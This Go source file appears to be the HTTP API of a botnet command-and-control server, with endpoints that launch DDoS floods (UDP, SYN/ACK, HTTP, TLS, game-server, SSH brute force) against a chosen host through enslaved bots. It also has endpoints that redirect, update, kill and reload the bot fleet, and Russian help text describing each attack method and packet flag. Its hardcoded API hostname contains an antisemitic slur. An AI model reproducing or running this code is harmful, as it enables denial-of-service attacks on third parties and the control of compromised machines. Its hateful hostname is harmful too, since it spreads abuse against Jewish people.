package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"
)

type apiResponse struct {
	Success bool   `json:"success"`
	Message string `json:"message"`
}

const apiBase = "http://opt.jewmailer.net:3779/api/attack"

func flagDescriptionRu(name string) string {
	switch name {
	case "size", "len":
		return "Размер данных пакета, по умолчанию 512 байт"
	case "rand":
		return "Случайное заполнение пакета, по умолчанию 1 (да)"
	case "tos":
		return "Поле TOS IP-заголовка, по умолчанию 0"
	case "ident":
		return "ID пакета, по умолчанию случайный"
	case "ttl":
		return "TTL в IP-заголовке, по умолчанию 255"
	case "df":
		return "Установить бит Don't Fragment, по умолчанию 0 (нет)"
	case "sport":
		return "Исходный порт, по умолчанию случайный"
	case "port":
		return "Порт назначения, по умолчанию случайный"
	case "dport":
		return "Порт назначения, по умолчанию случайный"
	case "domain":
		return "Домен для атаки"
	case "dhid":
		return "Transaction ID домена, по умолчанию случайный"
	case "urg":
		return "Установить бит URG, по умолчанию 0 (нет)"
	case "ack":
		return "Установить бит ACK, по умолчанию 0 (нет), кроме ACK flood"
	case "psh":
		return "Установить бит PSH, по умолчанию 0 (нет)"
	case "rst":
		return "Установить бит RST, по умолчанию 0 (нет)"
	case "syn":
		return "Установить бит SYN, по умолчанию 0 (нет), кроме SYN flood"
	case "fin":
		return "Установить бит FIN, по умолчанию 0 (нет)"
	case "seqnum":
		return "Значение номера последовательности TCP, по умолчанию случайное"
	case "acknum":
		return "Значение ACK number TCP, по умолчанию случайное"
	case "gcip":
		return "Внутренний IP назначения, по умолчанию 0 (нет)"
	case "method":
		return "HTTP метод, по умолчанию get"
	case "postdata":
		return "POST данные, по умолчанию пусто"
	case "path":
		return "HTTP путь, по умолчанию /"
	case "conns":
		return "Количество соединений"
	case "source":
		return "Исходный IP адрес, 255.255.255.255 для случайного"
	case "minlen":
		return "Минимальная длина"
	case "maxlen":
		return "Максимальная длина"
	case "payload":
		return "Пользовательский payload"
	case "repeat":
		return "Количество повторов"
	default:
		if info, ok := flagInfoLookup[name]; ok {
			return info.flagDescription
		}
		return ""
	}
}

func buildExampleURL(flagName string, withValue bool) string {
	base := apiBase + "?user=&pass=&host=&port=&time=&method=&" + flagName + "="
	if withValue {
		switch flagName {
		case "len", "size", "minlen", "maxlen":
			return apiBase + "?user=test&pass=test&host=1.2.3.4&port=80&time=60&method=udp&" + flagName + "=1400"
		case "port", "dport", "sport":
			return apiBase + "?user=test&pass=test&host=1.2.3.4&port=80&time=60&method=udp&" + flagName + "=8080"
		default:
			return apiBase + "?user=test&pass=test&host=1.2.3.4&port=80&time=60&method=udp&" + flagName + "=1"
		}
	}
	return base
}

func buildApiHelp(lang string) map[string]interface{} {
	methods := make([]map[string]string, 0, len(attackInfoLookup))
	for name, info := range attackInfoLookup {
		descEn := info.attackDescription
		method := map[string]string{"name": name, "description_en": descEn}
		method["description_ru"] = methodDescriptionRu(name)
		methods = append(methods, method)
	}

	flags := make([]map[string]string, 0, len(flagInfoLookup))
	for name, info := range flagInfoLookup {
		flagEntry := map[string]string{
			"flag":           name,
			"description_en": info.flagDescription,
			"description_ru":  flagDescriptionRu(name),
			"example":        buildExampleURL(name, false),
			"example2":       buildExampleURL(name, true),
		}
		flags = append(flags, flagEntry)
	}

	usageEn := apiBase + "?user={User}&pass={Pass}&host={Host}&port={Port}&time={Time}&method={Method}&len=1400"
	return map[string]interface{}{
		"success": true,
		"lang":    strings.ToLower(lang),
		"usage": map[string]string{
			"en": usageEn,
			"ru": usageEn,
		},
		"methods": methods,
		"flags":   flags,
	}
}

func methodDescriptionRu(name string) string {
	switch name {
	case "udp":
		return "UDP flood, оптимизирован под высокую пропускную способность"
	case "std":
		return "HEX flood, оптимизирован под большой размер пакета"
	case "stdhex":
		return "STDHEX flood, оптимизирован под большой PPS и обход серверов"
	case "udpbypass":
		return "NUDP flood, оптимизирован под высокий PPS"
	case "udphex":
		return "UDPHEX flood, оптимизирован под большой размер пакета"
	case "socket":
		return "TCP connect flood через реальные сокеты (без root)"
	case "raw":
		return "RAW UDP flood, требует root на боте"
	case "game":
		return "UDP flood для игр, оптимизирован для PING GAME"
	case "tcp":
		return "TCP flood (URG, ACK, SYN), оптимизирован для обхода серверов"
	case "http":
		return "Простой HTTP flood с высокими запросами"
	case "fivem":
		return "FiveM connect flood для игровых серверов"
	case "mc", "minecraft":
		return "Minecraft login flood через протокол сервера"
	case "ssh":
		return "SSH brute-force flood"
	case "tls", "tlsbomb":
		return "TLS ClientHello flood"
	default:
		return ""
	}
}

func buildAttackCommand(method, host, duration, port string, q url.Values) string {
	cmd := method + " " + host + " " + duration
	if port != "" && port != "0" {
		if _, err := strconv.Atoi(port); err == nil {
			cmd += " dport=" + port
		}
	}

	for _, key := range []string{"len", "size", "rand", "tos", "ident", "ttl", "df", "sport", "domain", "dhid", "urg", "ack", "psh", "rst", "syn", "fin", "seqnum", "acknum", "gcip", "method", "postdata", "path", "https", "conns", "source", "minlen", "maxlen", "payload", "repeat", "threads", "rate", "mode", "hver", "aggressive", "version"} {
		if value := strings.TrimSpace(q.Get(key)); value != "" {
			cmd += " " + key + "=" + value
		}
	}
	return cmd
}

func writeApiJSON(w http.ResponseWriter, status int, success bool, message string) {
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.WriteHeader(status)
	_ = json.NewEncoder(w).Encode(apiResponse{Success: success, Message: message})
}

func handleApiHelp(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	if r.Method != http.MethodGet && r.Method != http.MethodOptions {
		writeApiJSON(w, http.StatusMethodNotAllowed, false, "use GET")
		return
	}
	if r.Method == http.MethodOptions {
		w.Header().Set("Access-Control-Allow-Methods", "GET, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
		w.WriteHeader(http.StatusNoContent)
		return
	}
	lang := strings.ToLower(strings.TrimSpace(r.URL.Query().Get("lang")))
	if lang == "" {
		lang = "en"
	}
	if lang != "en" && lang != "ru" {
		lang = "en"
	}
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(buildApiHelp(lang))
}

func startApiServer(addr string) error {
	mux := http.NewServeMux()
	mux.HandleFunc("/api/help", handleApiHelp)
	mux.HandleFunc("/api/help/", handleApiHelp)
	mux.HandleFunc("/api/attack", handleApiAttack)
	mux.HandleFunc("/api/attack/", handleApiAttack)
	mux.HandleFunc("/api/fleet/stats", handleApiFleetStats)
	mux.HandleFunc("/api/fleet/manifest", handleApiFleetManifest)
	mux.HandleFunc("/api/fleet/redirect", handleApiFleetRedirect)
	mux.HandleFunc("/api/fleet/update", handleApiFleetUpdate)
	mux.HandleFunc("/api/fleet/kill", handleApiFleetKill)
	mux.HandleFunc("/api/fleet/stop", handleApiFleetStop)
	mux.HandleFunc("/api/fleet/reload", handleApiFleetReload)

	server := &http.Server{
		Addr:         addr,
		Handler:      mux,
		ReadTimeout:  15 * time.Second,
		WriteTimeout: 15 * time.Second,
	}
	fmt.Println("HTTP API listening on", addr)
	return server.ListenAndServe()
}

func handleApiAttack(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	if r.Method == http.MethodOptions {
		w.Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
		w.WriteHeader(http.StatusNoContent)
		return
	}
	if r.Method != http.MethodGet && r.Method != http.MethodPost {
		writeApiJSON(w, http.StatusMethodNotAllowed, false, "use GET or POST")
		return
	}

	q := r.URL.Query()
	user := strings.TrimSpace(q.Get("user"))
	pass := q.Get("pass")
	host := strings.TrimSpace(q.Get("host"))
	port := strings.TrimSpace(q.Get("port"))
	duration := strings.TrimSpace(q.Get("time"))
	method := strings.ToLower(strings.TrimSpace(q.Get("method")))
	if user == "" || pass == "" || host == "" || duration == "" || method == "" {
		writeApiJSON(w, http.StatusBadRequest, false, "missing parameter (user, pass, host, port, time, method)")
		return
	}

	userInfo, err := database.AuthApi(user, pass)
	if err != nil {
		writeApiJSON(w, http.StatusUnauthorized, false, err.Error())
		return
	}

	if !database.AttacksEnabled() {
		writeApiJSON(w, http.StatusForbidden, false, "attacks are currently disabled")
		return
	}

	if port != "" && port != "0" {
		if _, err := strconv.Atoi(port); err != nil {
			writeApiJSON(w, http.StatusBadRequest, false, "invalid port")
			return
		}
	}

	cmd := buildAttackCommand(method, host, duration, port, q)
	atk, err := NewAttack(cmd, userInfo.admin)
	if err != nil {
		writeApiJSON(w, http.StatusBadRequest, false, stripANSI(err.Error()))
		return
	}
	buf, err := atk.Build()
	if err != nil {
		writeApiJSON(w, http.StatusInternalServerError, false, "failed to build attack")
		return
	}
	if database.ContainsWhitelistedTargets(atk) {
		writeApiJSON(w, http.StatusForbidden, false, "target is whitelisted")
		return
	}

	botCount := userInfo.maxBots
	if can, err := database.CanLaunchAttack(userInfo.username, atk.Duration, cmd, botCount, 1); !can {
		msg := "attack cannot be launched"
		if err != nil {
			msg = err.Error()
		}
		writeApiJSON(w, http.StatusForbidden, false, msg)
		return
	}

	clientList.QueueBuf(buf, botCount, "")
	sent := clientList.Count()
	if botCount != -1 && botCount < sent {
		sent = botCount
	}
	writeApiJSON(w, http.StatusOK, true, fmt.Sprintf("attack sent to %d bots", sent))
}

func requireFleetAdmin(w http.ResponseWriter, user, pass string) (AccountInfo, bool) {
	userInfo, err := database.AuthApi(user, pass)
	if err != nil {
		writeApiJSON(w, http.StatusUnauthorized, false, err.Error())
		return AccountInfo{}, false
	}
	if userInfo.admin != 1 {
		writeApiJSON(w, http.StatusForbidden, false, "admin access required")
		return AccountInfo{}, false
	}
	return userInfo, true
}

func handleApiFleetStats(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	if r.Method == http.MethodOptions {
		w.WriteHeader(http.StatusNoContent)
		return
	}
	q := r.URL.Query()
	if _, ok := requireFleetAdmin(w, strings.TrimSpace(q.Get("user")), q.Get("pass")); !ok {
		return
	}
	stats := collectFleetStats()
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]interface{}{
		"success":  true,
		"stats":    stats,
		"manifest": fleet.Manifest(),
	})
}

func handleApiFleetManifest(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	if r.Method == http.MethodOptions {
		w.WriteHeader(http.StatusNoContent)
		return
	}
	q := r.URL.Query()
	if _, ok := requireFleetAdmin(w, strings.TrimSpace(q.Get("user")), q.Get("pass")); !ok {
		return
	}
	if strings.EqualFold(strings.TrimSpace(q.Get("action")), "reload") {
		if err := fleet.ReloadManifest(); err != nil {
			writeApiJSON(w, http.StatusInternalServerError, false, err.Error())
			return
		}
		writeApiJSON(w, http.StatusOK, true, "manifest reloaded")
		return
	}
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]interface{}{
		"success":  true,
		"manifest": fleet.Manifest(),
	})
}

func handleApiFleetRedirect(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	if r.Method == http.MethodOptions {
		w.WriteHeader(http.StatusNoContent)
		return
	}
	q := r.URL.Query()
	if _, ok := requireFleetAdmin(w, strings.TrimSpace(q.Get("user")), q.Get("pass")); !ok {
		return
	}

	host := strings.TrimSpace(q.Get("host"))
	portStr := strings.TrimSpace(q.Get("port"))
	if host == "" || strings.EqualFold(host, "manifest") {
		m := fleet.Manifest().Redirect
		if m == nil || m.Host == "" || m.Port <= 0 {
			writeApiJSON(w, http.StatusBadRequest, false, "manifest redirect not configured")
			return
		}
		host, portStr = m.Host, strconv.Itoa(m.Port)
	}
	port, err := strconv.Atoi(portStr)
	if err != nil || port <= 0 || port > 65535 {
		writeApiJSON(w, http.StatusBadRequest, false, "invalid port")
		return
	}

	res, err := fleetBroadcastRedirect(host, port)
	if err != nil {
		writeApiJSON(w, http.StatusBadRequest, false, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"result":  res,
	})
}

func handleApiFleetUpdate(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	if r.Method == http.MethodOptions {
		w.WriteHeader(http.StatusNoContent)
		return
	}
	q := r.URL.Query()
	if _, ok := requireFleetAdmin(w, strings.TrimSpace(q.Get("user")), q.Get("pass")); !ok {
		return
	}

	mode := strings.ToLower(strings.TrimSpace(q.Get("mode")))
	opts := struct {
		Force       bool
		VersionLT   *uint8
		UseManifest bool
	}{UseManifest: true}

	switch mode {
	case "", "all":
	case "v1":
		v := uint8(fleet.Manifest().Version)
		if v == 0 {
			v = 2
		}
		opts.VersionLT = &v
	case "force":
		opts.Force = true
	default:
		writeApiJSON(w, http.StatusBadRequest, false, "mode must be all, v1, or force")
		return
	}

	res, err := fleetBroadcastUpdate(opts)
	if err != nil {
		writeApiJSON(w, http.StatusInternalServerError, false, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"result":  res,
	})
}

func handleApiFleetKill(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	if r.Method == http.MethodOptions {
		w.WriteHeader(http.StatusNoContent)
		return
	}
	q := r.URL.Query()
	if _, ok := requireFleetAdmin(w, strings.TrimSpace(q.Get("user")), q.Get("pass")); !ok {
		return
	}
	res := fleetBroadcastKill()
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"result":  res,
	})
}

func handleApiFleetStop(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	if r.Method == http.MethodOptions {
		w.WriteHeader(http.StatusNoContent)
		return
	}
	q := r.URL.Query()
	if _, ok := requireFleetAdmin(w, strings.TrimSpace(q.Get("user")), q.Get("pass")); !ok {
		return
	}
	res := fleetBroadcastStop()
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"result":  res,
	})
}

func handleApiFleetReload(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	if r.Method == http.MethodOptions {
		w.WriteHeader(http.StatusNoContent)
		return
	}
	q := r.URL.Query()
	if _, ok := requireFleetAdmin(w, strings.TrimSpace(q.Get("user")), q.Get("pass")); !ok {
		return
	}
	res := fleetBroadcastReload()
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"result":  res,
	})
}

func stripANSI(s string) string {
	var b strings.Builder
	b.Grow(len(s))
	for i := 0; i < len(s); i++ {
		if s[i] == 0x1b {
			for i < len(s) && s[i] != 'm' {
				i++
			}
			continue
		}
		b.WriteByte(s[i])
	}
	return strings.TrimSpace(b.String())
}